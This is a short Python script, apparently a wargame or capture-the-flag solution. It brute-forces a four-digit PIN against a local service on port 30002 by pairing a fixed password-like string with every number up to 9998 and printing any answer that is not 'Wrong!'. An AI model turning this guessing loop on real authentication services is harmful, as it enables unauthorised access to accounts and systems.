#!/usr/bin/python
import shoe

s = shoe.Shoe('localhost', 30002)
for i in range(0, 9999):
    cmd = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {}".format(i)
    s.write(cmd + "\n")
    r = s.read_until_end(.001)
    if "Wrong!" not in r and len(r) > 10:
            print(r)
